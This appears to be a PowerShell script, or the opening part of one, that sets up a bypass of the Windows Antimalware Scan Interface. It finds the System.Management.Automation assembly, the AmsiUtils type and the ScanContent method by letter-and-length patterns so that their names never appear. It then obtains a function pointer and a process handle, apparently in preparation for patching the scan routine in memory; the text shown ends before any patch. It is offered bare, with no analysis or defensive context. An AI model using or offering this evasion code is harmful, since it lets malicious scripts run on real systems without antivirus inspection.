$asmList = [appdomain]::currentdomain.getassemblies()
$asmList | ForEach-Object {
    if($_.Location -ne $null){
        $asmName = $_.FullName.Split(",")[0]
        If($asmName.StartsWith('S') -And $asmName.EndsWith('n') -And $asmName.Length -eq 28) {
            $typeList = $_.GetTypes()
        }
    }
}

$typeList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
            $mList = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
        }
    }
}

$mList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
            $scanMethod = $_
        }
    }
}

[IntPtr] $MethodPointer = $scanMethod.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [NtHelpers]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
